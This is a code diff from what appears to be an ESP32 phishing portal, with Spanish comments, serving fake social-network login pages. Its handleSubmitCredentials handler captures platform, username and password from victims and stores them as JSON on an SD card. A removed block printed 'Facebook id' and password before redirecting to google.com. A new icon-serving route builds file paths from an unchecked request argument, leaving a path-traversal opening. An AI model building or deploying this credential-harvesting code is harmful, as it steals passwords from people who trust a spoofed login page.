@@ -103,48 +103,30 @@ protected:
     inline void handleSubmitCredentials()
     {
         // variables para almacenar temporalmente las entradas del usuario
-        String credentials = "platform: " + m_server->arg("platform");
-        credentials.concat("\nuid: " + m_server->arg("username"));
-        credentials.concat("\npsw: " + m_server->arg("password"));
+        String credentials = "{\n\t\"platform\": \"" + m_server->arg("platform") + "\"\n";
+        credentials.concat("\t\"user id\": \"" + m_server->arg("username") +"\"\n");
+        credentials.concat("\t\"password\": \"" + m_server->arg("password") + "\"\n},");
+
 
         // guarda las entradas en un archivo de texto
-        //  m_sdManager->appendFile(m_datafile, credentials);
         if (!saveToDataFile(credentials))
         {
             m_sdManager->logEvent("Error al guardar las credenciales");
 #if (WITH_ERROR_TYPE)
             Serial.println(ERROR_SAVE_CREDENTIALS);
 #endif
+            m_server->send(417, "text/plain", "");
+            return;
         }
 
-        // se imprime por consola los valores de las entradas
-        Serial.println("Social network: " + m_server->arg("platform"));
-        Serial.println("Username: " + m_server->arg("username"));
-        Serial.println("Password: " + m_server->arg("password"));
+#if (WITH_SUCCESS_MESSAGE)
+            // se imprime por consola los valores de las entradas
+            Serial.println(SUCCESS_SAVE_CREDENTIALS);
+#endif 
         // se envia una respuesta al cliente
         m_server->send(201, "text/plain", "");
     }
 
-    /*
-    inline void handleSubmit()
-    {
-        //variables para almacenar temporalmente las entradas del usuario
-        String credentials = "uid: " + m_server->arg("username");
-        //String password
-        credentials.concat("\npsw: " + m_server->arg("password"));
-
-        //se imprime por consola los valores de las entradas
-        Serial.println("Facebook id: "+ m_server->arg("username"));
-        Serial.println("Password: "+ m_server->arg("password"));
-
-        m_server->sendHeader("Location", "http://www.google.com");
-        m_server->send(302, "text/plain", "Redirecting");
-
-        Serial.print("There are currently ");
-        Serial.print(WiFi.softAPgetStationNum());
-        Serial.print(" hosts connected.\n");
-    }
-    */
 
     inline void handleAdminLogin()
     {
@@ -200,6 +182,55 @@ protected:
 
         Serial.printf("Nueva solicitud de pagina %s\n", platform.c_str());
         m_server->send(200, "text/html", content);
+    }
+
+    inline void handlePageIcons(void)
+    {
+        if (!m_server->hasArg("icon-name"))
+        {
+            m_server->send(400, "text/plain", "");
+            return;
+        }
+        String iconPath = "/webpages/icons/" +
+                          m_server->arg("icon-name");
+
+         if(!m_sdManager->getFileSystem().exists(iconPath))
+        {
+    #if (WITH_ERROR_TYPE)
+            Serial.printf(ERROR_NO_FILE, iconPath);
+    #endif
+            m_server->send(404, "text/plain", "File doens't exist");
+            return;
+        }
+
+        File file = m_sdManager->getFileSystem().open(iconPath);
+
+        if(!file)
+        {
+            m_server->send(404, "text/plain", "File not found");
+            return;
+        }
+
+        String fileName = file.name();
+        size_t fileSize = file.size();
+
+        m_server->sendHeader("Content-Length", String(fileSize));
+        m_server->sendHeader("Cache-Control", "max-age=31536000");
+        m_server->setContentLength(fileSize);
+        m_server->send(200, "image/png", "");
+        
+        Serial.printf("Sending file %s to client....\n", fileName.c_str());
+        static const size_t BUFFER_SIZE = 1024;
+        uint8_t buffer[BUFFER_SIZE];
+
+        while(file.available())
+        {
+            size_t bytesRead = file.read(buffer, BUFFER_SIZE);
+            m_server->client().write(buffer, bytesRead);
+        }
+        
+        file.close();
+        m_sdManager->logEvent("Sent file to client");
     }
 
     /*!
@@ -373,23 +404,18 @@ public:
     inline void start()
     {
         // setupCaptivePortal(); <-- shouldn't setup captive portal for the server
-
-        // Configure web server routes
-        // m_server->on("/", HTTP_GET, [this]() { handleRoot(); });  <- for the captive portal access point
-        // m_server->on("/submit", HTTP_POST, [this]() { handleSubmit(); });
-        // m_server->on("/login", HTTP_POST, [this]() { handleLogin(); });
         m_server->on("/", HTTP_GET, [this](){
                         String content = m_sdManager->readFile(m_indexPage);
                         m_server->send(200, "text/html", content); });
+
+        m_server->on("/ ", HTTP_PUT, [this]()
+                     { handleFileUpload(); });
 
         m_server->on("/login", HTTP_POST, [this]()
                      { handleAdminLogin(); });
 
         m_server->on("/admin-panel", HTTP_POST, [this]()
                      { handleAdminPanel(); });
-
-        m_server->on("/ ", HTTP_PUT, [this]()
-                     { handleFileUpload(); });
 
         m_server->on("/admin-panel/admin-app.js", HTTP_GET, [this](){
                 String content = m_sdManager->readFile(m_sdManager->getFileDir(m_indexPage)
@@ -410,6 +436,9 @@ public:
 
         m_server->on("/submit-credentials", HTTP_POST, [this]()
                      { handleSubmitCredentials(); });
+
+        m_server->on("/get-page-icons", HTTP_GET, [this]()
+                     { handlePageIcons(); });
 
         m_server->onNotFound([this](){
             m_server->sendHeader("Location", "/");
@@ -677,10 +706,6 @@ public:
             // Remove last comma and close JSON array
             *fileList = fileList->substring(0, fileList->length() - 2);
             *fileList += "\n\t]\n}";
-
-            Serial.println("files list: ");
-            Serial.println(*fileList);
-            delay(2000);
             
             if (!m_sdManager->writeFile(JSON_FILE_PATH, *fileList))
                 Serial.println(ERROR_GENERATE_JSON);
